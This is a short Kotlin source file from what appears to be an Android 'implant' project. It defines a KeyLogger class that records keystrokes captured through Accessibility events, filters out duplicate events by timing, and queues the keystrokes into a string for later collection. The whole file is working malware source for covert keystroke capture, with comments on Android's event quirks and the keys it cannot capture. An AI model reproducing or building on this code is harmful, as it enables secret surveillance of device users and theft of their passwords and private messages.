/*
* Records keystrokes sent from the Keyboard and adds them to a queue.
* Since Android sometimes sends duplicate AccessibilityEvents, we store the timestamp of the last
* keystroke and ensure that the key events are far apart enough to be typed by a human before
* adding them to the queue.
* Spaces, backspace and enter keys are currently unsupported as no AccessibilityEvent seems to be
* fired for them.
* */

package com.cooperthecoder.implant.dagger

import com.cooperthecoder.implant.Config
import java.util.*

class KeyLogger {

    val keystrokeStack: Stack<String> = Stack()
    var lastEvent = 0L

    fun recordKeystroke(keystroke: String, time: Long) {
        // Avoid duplicate events from Android
        val elapsed = time - lastEvent
        if (elapsed < Config.KEY_PRESS_TIMEOUT) {
            return
        }

        lastEvent = time
        keystrokeStack.push(keystroke)
    }

    fun emptyKeyQueue(): String {
        val keystrokes = keystrokeStack.joinToString("-")
        keystrokeStack.clear()
        return keystrokes
    }
}